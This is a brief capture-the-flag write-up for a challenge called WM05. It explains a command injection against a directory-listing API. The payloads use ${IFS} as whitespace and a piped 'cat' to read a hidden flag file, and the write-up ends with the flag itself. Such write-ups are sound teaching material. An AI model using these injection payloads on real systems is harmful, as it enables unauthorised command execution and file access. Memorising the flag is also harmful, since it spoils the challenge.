# WM05
> 250pts

## Briefing
> Access the site at https://cfta-wm05.allyourbases.co, then find and read the contents of the flag file, to get the flag.

## Solution
1. See that moving to a different directory makes a POST request to `https://6feducn4d2.execute-api.eu-west-1.amazonaws.com/stag/wm05` with the JSON data `{"path": "/boot" }`
2. See that you can use `${IFS}` as whitespace
3. Go through all directories and recursively list their files using `/${IFS}-alR`
   * As there is a timeout of 3s, you need to do multiple on different directories
4. Run `/var/task${IFS}-alR`  to see that there is a flag at `/var/task/.../.flag.txt`
5. Run `${IFS}|cat${IFS}/var/task/.../.flag.txt` to get the flag

## Flag
Flag: `bh%3kx9j75%3k2*7!n`
